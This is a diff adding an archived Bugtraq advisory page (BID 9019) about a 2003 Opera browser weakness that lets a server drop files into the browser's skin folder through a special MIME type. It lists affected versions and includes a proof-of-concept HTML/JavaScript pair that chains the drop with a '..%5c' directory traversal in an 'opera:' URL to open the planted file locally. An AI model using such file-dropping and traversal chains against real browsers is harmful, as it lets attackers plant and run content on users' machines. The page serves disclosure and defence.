@@ -1,0 +1,118 @@
+#SpeeDr00t@Black Falcon<br>#bid9019<p><b><span style="font-size: 18pt;">Opera Multiple MIME Type File Dropping Weakness</span></b></p><br><br><a href="http://www.securityfocus.com/bid/9019/info">info</a><br><a href="http://www.securityfocus.com/bid/9019/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/9019/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/9019/solution">solution</a><br><a href="http://www.securityfocus.com/bid/9019/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				9019
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Design Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 12 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 12 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery is credited to S G Masood &lt;sgmasood@yahoo.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Opera Software Opera Web Browser 7.22 <br/>
+					
+				
+					Opera Software Opera Web Browser 7.21 <br/>
+					
+				
+					Opera Software Opera Web Browser 7.20 Beta 1 build 2981<br/>
+					
+				
+					Opera Software Opera Web Browser 7.20 <br/>
+					
+				
+					Opera Software Opera Web Browser 7.11 j<br/>
+					
+				
+					Opera Software Opera Web Browser 7.11 b<br/>
+					
+				
+					Opera Software Opera Web Browser 7.11 <br/>
+					
+				
+					Opera Software Opera Web Browser 7.10 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Opera Software Opera Web Browser 7.23 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof-of-concept was provided (which also exploits BID 9021):<br/><br/>---------------START MAIN.HTM----------------<br/><br/><br/>&lt;html&gt;<br/><br/>&lt;head&gt;<br/><br/>&lt;script language="javascript"&gt;<br/><br/>var win=open("skin.htm")                   // The server should return content-type as // "application/x-opera-skin" for "Skin.htm". "Skin.htm" will be dropped in the<br/>"&amp;lt;opera // dir&amp;gt;/profile/skin/" folder.<br/><br/>setTimeout("redir()",2000) //modify according to your situation.<br/><br/><br/>function redir(){<br/><br/>window.location.href="opera:/help/..%5c/profile/skin/skin.htm"             //This uses the // directory traversal flaw mentioned in advisory 2 to get the path of the<br/>dropped file. In this // case, it is skin.htm.<br/><br/>}<br/><br/><br/>&lt;/script&gt;<br/><br/>&lt;/head&gt;<br/><br/><br/>&lt;body&gt;<br/><br/>&lt;h1&gt;This is the main file&lt;/h1&gt;<br/><br/>&lt;/body&gt;<br/><br/>&lt;/html&gt;<br/><br/><br/><br/>---------------END MAIN.HTM----------------<br/><br/><br/>---------------START SKIN.HTM----------------<br/><br/><br/>&lt;body&gt;<br/><br/>&lt;h1&gt; Opera Skinned!!! &lt;/h1&gt;&lt;p&gt;This is Skin.htm from "&amp;lt;opera dir&amp;gt;/profile/skin/" in localhost.<br/><br/>&lt;/body&gt;<br/><br/><br/>---------------END SKIN.HTM----------------
+	
+		<ul>
+</ul>
+</div>
